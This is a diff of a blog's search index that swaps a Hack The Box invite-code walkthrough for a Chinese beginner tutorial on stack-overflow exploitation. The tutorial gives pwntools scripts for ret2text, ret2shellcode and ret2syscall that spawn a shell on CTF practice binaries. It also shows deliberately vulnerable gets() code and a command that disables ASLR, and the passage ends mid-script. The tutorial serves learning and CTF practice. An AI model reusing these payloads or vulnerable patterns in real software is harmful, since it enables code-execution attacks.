@@ -1766,32 +1766,232 @@ is_numeric()：   用于检测变量是否为数字或数字字符串</p>
       </tags>
   </entry>
   <entry>
-    <title>Hack The Box账号注册</title>
-    <url>/posts/33946/</url>
-    <content><![CDATA[<h2 id="引言"><a class="header-anchor" href="#引言">¶</a>引言</h2>
-<p>hack the box 是一个很有趣也很强大的网站，开始接触的时候就被里面的元素给吸引到了，同时，网站的注册也是让人能忍不住动手去探索一下，下面分享一下过程。</p>
-<h2 id="正文"><a class="header-anchor" href="#正文">¶</a>正文</h2>
-<p>打开网站注册的时候，提示需要自己入侵网站获取注册</p>
-<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/psc.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/13.jpg" alt=""></p>
-<p>在下面的clickhere提示我们需要打开控制台查看，于是打开控制台，发现一个可疑的js文件，js文件带有inviteapi名字</p>
-<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/132165.png" alt=""></p>
-<p>跑去查看js文件源码</p>
-<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/894.png" alt=""></p>
-<p>发现function，console，log等关键字，可以猜测后面makeInviteCode是一个方法，需要我们在控制台打印，然后我们溜去控制台试试~</p>
-<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/165123.png" alt=""></p>
-<p>给出一串数据，还提示我们是rot13密文加密方式，于是我们去解解看</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string  </span><br><span class="line"> </span><br><span class="line">upperdict = &#123;&#125;  </span><br><span class="line">lowerdict = &#123;&#125;  </span><br><span class="line">upperletters =string.ascii_uppercase</span><br><span class="line">lowerletters =string.ascii_lowercase<span class="comment">#：所有小写字母</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">dststr = []  </span><br><span class="line">oristr = <span class="built_in">input</span>(<span class="string">&#x27;Enter string to rot13:&#x27;</span>)<span class="comment">#版本3.0不能用raw_input</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Your string ro en/crypt was :&#x27;</span>,oristr ) </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(lowerletters)):                       <span class="comment">#把所有小写字母转为rot13  </span></span><br><span class="line">	<span class="keyword">if</span> i&lt;<span class="number">13</span>:  </span><br><span class="line">		lowerdict[lowerletters[i]] = lowerletters[i+<span class="number">13</span>]  </span><br><span class="line">	<span class="keyword">else</span>:  </span><br><span class="line">		lowerdict[lowerletters[i]] = lowerletters[i-<span class="number">13</span>]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(upperletters)):                       <span class="comment">#把所有大写字母转为rot13  </span></span><br><span class="line">	<span class="keyword">if</span> i&lt;<span class="number">13</span>:  </span><br><span class="line">		lowerdict[upperletters[i]] = upperletters[i+<span class="number">13</span>]  </span><br><span class="line">	<span class="keyword">else</span>:  </span><br><span class="line">		lowerdict[upperletters[i]] = upperletters[i-<span class="number">13</span>]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> oristr:  </span><br><span class="line">	<span class="keyword">if</span> ch <span class="keyword">in</span> lowerdict:  </span><br><span class="line">		dststr.append(lowerdict[ch])  </span><br><span class="line">	<span class="keyword">elif</span> ch <span class="keyword">in</span> upperdict:  </span><br><span class="line">		dststr.append(upperdict[ch])  </span><br><span class="line">	<span class="keyword">else</span>:  </span><br><span class="line">		dststr.append(ch)  </span><br><span class="line">dststr = <span class="string">&#x27;&#x27;</span>.join(dststr)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the rot13 string is:&#x27;</span>,dststr ) </span><br></pre></td></tr></table></figure>
-<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/sff2132.png" alt=""></p>
-<p><strong>解密结果：</strong></p>
-<p>In order to generate the invite code, make a POST request to /api/invite/generate</p>
-<p>要想获得注册邀请码，必须使用post方式向此处地址发送请求获取，于是我们马不停蹄得溜去发送请求~~</p>
-<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/1231321.png" alt=""></p>
-<p>返回一段被base64方式加密的密文，我们再次跑去解密base64</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span>=<span class="string">&quot;SElNRFctSURTRUwtQkZUVEQtTFBJUkQtSFlTWUI=&quot;</span></span><br><span class="line"></span><br><span class="line">temp = base64.b64decode(<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(temp.decode())</span><br></pre></td></tr></table></figure>
-<p><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/12315131.png" alt=""></p>
-<p>这下子看起来没有问题了，我们可以愉快的拿着邀请码去注册了！！！</p>
+    <title>pwn新手入门之栈溢出</title>
+    <url>/posts/54640/</url>
+    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
+<p>国庆假期打算学学pwn，文章内容主要是跟着 ctfwiki 一路学习下来。</p>
+<h2 id="栈的介绍"><a class="header-anchor" href="#栈的介绍">¶</a>栈的介绍</h2>
+<p>什么是栈，相信修过数据结构的同学们应该都了解清楚了。栈是一种先进后出的数据结构，其操作主要有入栈(push)和出栈(pop)两种操作，如下图所示<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/misc/stack.png" alt=""><br>
+在高级语言运行时会转换为汇编语言，而汇编语言运行的过程中，使用栈的数据结构，用于保存函数的调用信息和局部变量。在学习栈时需要注意 <strong>程序的栈是从进程地址空间的高地址向低地址增长</strong></p>
+<h2 id="栈溢出原理"><a class="header-anchor" href="#栈溢出原理">¶</a>栈溢出原理</h2>
+<p>栈溢出指的是向栈中某个变量写入的字节数超过了这个变量本身所申请的字节数，因此导致了与其相邻的栈中的变量的值被改变。栈溢出漏洞轻则导致程序的崩溃，重则导致攻击者可以控制程序的执行流程。理解概念后，就可以梳理清楚栈溢出漏洞的前提</p>
+<blockquote>
+<ul>
+<li>程序必须向栈上写入数据。</li>
+<li>写入的数据大小没有被良好地控制。</li>
+</ul>
+</blockquote>
+<p>最经典的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址（当然这个控制地址必须有可执行的权限），我们以一个例子来呈现</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123; <span class="built_in">puts</span>(<span class="string">&quot;flag&#123;208f1b1289da972682cbc81c8684fcc8&#125;&quot;</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先将该文件进行编译</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie stack1.c -o stack1</span><br></pre></td></tr></table></figure>
+<p>gcc编译指令中，<code>-m32</code>表示生成32位程序；<code>-fno-stack-protector</code>指的是不开始堆栈溢出保护，即不生成canary；<code>-no-pie</code>表示关闭PIE，避免基址被打乱，生成后用 <strong>checksec</strong> 检查编译出的程序PIE是否关闭<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/misc/S%7D%60M%7DZUMF%7D13%5DUBA%289R0NQN.png" alt=""><br>
+从图中可以看出，在编译程序的时候就提醒了我们<code>gets</code>函数是一个危险函数。因为它不检查输入的字符串长度，而是以回车来判断结束，因此容易导致栈溢出漏洞的产生。</p>
+<p>接着上面说的 PIE 保护，实质上，linux系统存在地址空间分布随机化（ASLR）机制，简单说就是即使可执行文件开启了 PIE 保护，还需要系统来开启 ASLR 才会真正打乱基址，否则依旧会加载在一个固定的基址上<br>
+我们可以通过<code>cat /proc/sys/kernel/randomize_va_space</code>来查看ASLR启动与否</p>
+<blockquote>
+<ul>
+<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
+<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
+<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
+</ul>
+</blockquote>
+<p>我们通过<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>来关闭ASLR</p>
+<p>接下来，我们将生成的可执行文件导入到 ida 进行查看，在main函数中会进入到 <strong>vulnerable()</strong> 函数<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/misc/%25%29_I4VHXY%40W%29%29O%60%40_DMU%5DPK.png" alt=""><br>
+双击<code>char s</code>，可以看到栈空间大小为<code>0x14</code>，到函数的返回值为<code>0x4-(-0x14)=0x18</code>，也就是只需要18个字节，我们就可以覆盖返回地址的内容。<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/misc/E%5DSFORK4P1NSS%7D__O%28_Q%2533.png" alt=""><br>
+我们知道函数的调用过程是，当子函数执行完毕，就会把主函数下一个命令的地址出栈并赋值给 EIP 寄存器，随后 EIP 寄存器就会去该地址执行。而我们在ida中可以看到含有 flag 的 <strong>success</strong> 函数地址为<code>0x08048456</code>，所以我们exp如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./stack1&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>+p32(<span class="number">0x08048456</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/misc/%286AY1M%29%289_F%2490_0CM091HX.png" alt=""></p>
+<p>成功执行 <strong>success</strong> 函数获取到flag</p>
+<h2 id="基本ROP"><a class="header-anchor" href="#基本ROP">¶</a>基本ROP</h2>
+<blockquote>
+<p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在 <strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong> 所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
+</blockquote>
+<p>常用的汇编指令如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MOV %src %dest :把数据从源地放到目的地</span><br><span class="line"></span><br><span class="line">push：从栈中取出一个元素</span><br><span class="line"></span><br><span class="line">POP：往栈中压入一个元素</span><br><span class="line"></span><br><span class="line">call：将当前的指令指针EIP(该指针指向紧接在call指令后的下条指令)压入堆栈</span><br><span class="line"></span><br><span class="line">ret：从栈顶弹出返回地址(之前call指令保存的下条指令地址)到EIP寄存器中，程序转到该地址处继续执行(此时ESP指向进入函数时的第一个参数)</span><br></pre></td></tr></table></figure>
+<p>ROP，其核心在于利用了指令集中的ret指令，改变了指令流的执行顺序。ROP攻击一般需要满足如下条件</p>
+<blockquote>
+<ul>
+<li>程序存在溢出，并且可以控制返回地址。</li>
+<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>
+</ul>
+</blockquote>
+<p>但是如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了</p>
+<h3 id="ret2text"><a class="header-anchor" href="#ret2text">¶</a>ret2text</h3>
+<blockquote>
+<p>ret2text是一种控制程序执行程序本身已有的的代码的攻击方式，我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP</p>
+</blockquote>
+<p>点击下载文件：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a><br>
+首先使用<code>checksec</code>检查文件，发现是32位程序，且只开启了NX保护（shellcode不可执行）<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/RO5E0%250_W%609%5BCOZPIKL546G.png" alt=""><br>
+拖进 ida 中观察，main 函数使用了gets</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>并且还有一个 secure() 函数，其中含有<code>/bin/sh</code><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/0P19P_C1Y%40RIV2%60F%40BVPG4G.png" alt=""><br>
+其地址为<code>0x0804863A</code>，接着就是计算 s 相对于返回地址的偏移，首先打开 gdb 运行文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb ret2text</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/60TFV9HH%5DGCNT8H1%24DO%249UB.png" alt="">接着另起一个窗口使用 cyclic 工具生成字符，比如这里生成150的字符</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cyclic 150</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/9CXS85B9OPKNQTQEW30X7RD.png" alt=""><br>
+然后放到gdb中回车<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/%29F%7DU3ZSNATF6FLKBA7D8C0Y.png" alt=""><br>
+可以看到报错的地址为<code>0x62616164</code><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/%7D~2AK6VECS04%29SP9_58GX%28D.png" alt=""><br>
+然后用 cyclic 计算偏移大小为112<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/2%25%5BU%7D%5DS%25S%409TGB%5D%24Y8ZR_%7D4.png" alt=""><br>
+所以exp如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(<span class="number">0x0804863A</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/7GC4%40JQ0RUJ%24VZJ9RO18%7BQQ.png" alt=""></p>
+<h3 id="ret2shellcode"><a class="header-anchor" href="#ret2shellcode">¶</a>ret2shellcode</h3>
+<blockquote>
+<p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。</p>
+</blockquote>
+<p>在栈溢出的基础上，如果要执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限<br>
+点击下载：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a><br>
+首先使用 checksec 检查文件<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2shellcode/%5BO1EC%5B_4YCU%5DGRI%7BG6%28B%2861.png" alt=""><br>
+是一个32位程序，并且几乎没有什么保护，拖进 ida 中按F5查看 mian 函数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, &amp;s, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用了 gets，存在基本的栈溢出漏洞，此外还将字符串 s 复制到了 buf2，双击buf2<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2shellcode/5L3_12Y%7B_BWNCENC8XN%5B3%298.png" alt=""><br>
+可以看到 buf2 在 bss 段上，地址为<code>0x0804A080</code>，使用 gdb 调试查看该段是否有可执行的权限，依次执行命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb ret2shellcode  #使用gdb</span><br><span class="line">b main             #在main下断点</span><br><span class="line">r                  #运行程序</span><br><span class="line">vmmap              #查看栈、bss段是否可以执行</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2shellcode/E1T%251H66ID%5DH2O_4J_C%60J%407.png" alt=""><br>
+可以看到该段是具有可执行的权限，而<code>0x0804A080</code>正好在此区间</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x0804a000 0x0804b000 rwxp	&#x2F;home&#x2F;hacker&#x2F;Desktop&#x2F;gongfangword-pwn&#x2F;ret2shellcode</span><br></pre></td></tr></table></figure>
+<p>所以我们可以控制程序读取 shellcode 之后，执行 bss 段处的 shellcode，首先和上面 <code>ret2text</code>一样的办法先计算出偏移<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2shellcode/8%29WKTI%7DS%295_A6ZNP%24_%25%7D%5B%5BD.png" alt=""><br>
+得到112，然后开始写exp，其中 shellcode 可以由 pwntools 生成</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2shellcode&quot;</span>)</span><br><span class="line"><span class="comment">#由pwntools生成shellcode，然后通过asm转换成字节码</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#ljust是向左对齐填充字节，这里是将shellcode填充完后，不足112长度的地方用a来填充</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;a&#x27;</span>) + p32(<span class="number">0x0804A080</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行后成功获取交互式shell<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2shellcode/9QD%606TJT%2912MR%24UM1YQHCOB.png" alt=""></p>
+<h3 id="ret2syscall"><a class="header-anchor" href="#ret2syscall">¶</a>ret2syscall</h3>
+<p>ret2syscall，简单来说就是控制程序执行系统调用获取 shell，继续以题目为例<br>
+点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a><br>
+首先使用 checksec 检查文件<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/GE3SE5C%7DBY%7BS2%28ND%40%7DKZ%7D0K.png" alt=""><br>
+32位程序，并且开启了NX保护（即shellcode不可执行)，ida 查看依然是一个典型栈溢出</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+<p>由于我们不能像之前一样直接利用程序中的某段代码或者自己填写代码拿到shell，所以需要利用程序中的 gadgets 来获得 shell<br>
+首先我们需要了解一下 Linux 的系统调用知识点：</p>
+<blockquote>
+<p>Linux的系统调用通过 int 80h 实现，并且用系统调用号来区分入口的函数</p>
+<p>调用流程如下：<br>
+1、将系统调用编号存入 eax 寄存器中<br>
+2、将函数的参数存入其他通用的寄存器（ebx、ecx、edx…）<br>
+2、触发 0x80 号中断</p>
+</blockquote>
+<p>比如我们通过系统调用执行：<code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>，如图所示<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/im.png" alt=""><br>
+首先计算栈空间偏移，用之前提到的办法计算<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/%5D%29JXV8U_O%5DQ7YBCM6X91%281G.png" alt=""><br>
+值求得为112，所以需要填充的空间大小为112<br>
+接着需要知道 <code>execve</code> 的系统调用号（32位)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd_32.h | grep execve</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/%7BRU%40%40BJVQ7KHNC_WP6F7V_M.png" alt=""><br>
+可以看到值为11，转换为16进制就是<code>0xb</code>，接着我们使用 <strong>ROPgadget</strong> 工具开始寻找含有<code>pop eax</code>的指令地址</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#39;pop|ret&#39; | grep &#39;eax&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/R71ZMG5M21Y%282V%40Z0%29UJFRP.png" alt=""><br>
+上述几个都可以控制 eax 寄存器，我们这里选取第二个，即地址为<code>0x080bb196</code><br>
+接着寻找<code>pop ebx</code>的指令地址</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#39;pop|ret&#39; | grep &#39;ebx&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/%25OOMLA%28_W4YBE%25M8N%28BD%7B%404.png" alt=""><br>
+可以发现在找<code>pop ebx</code>的过程中发现这个地址同时包含控制 ecx、edx 的操作，所以我们选取地址<code>0x0806eb90</code>进行使用<br>
+接着寻找<code>/bin/sh</code>的地址了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop --string &#39;&#x2F;bin&#x2F;sh&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/8%245%40TQI8%60%28%60E%5BL%5DN1D03%246H.png" alt=""><br>
+地址为<code>0x080be408</code>，最后只剩下<code>int 80h</code>的地址了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#39;int&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/%7BXSEDSULQ%5D8AICT701B0XVY.png" alt=""><br>
+地址为<code>0x08049421</code>，地址都找齐了，就可以开始写exp了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span></span><br><span class="line">bin_sh = <span class="number">0x080be408</span></span><br><span class="line">int_80 = <span class="number">0x08049421</span></span><br><span class="line"><span class="comment">#这里需要按照pop_edx_ecx_ebx的操作顺序来写，所以bin_sh在两个0后面</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(pop_eax_ret) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh) + p32(int_80)</span><br><span class="line">p.sendline(payload)</span><br><span 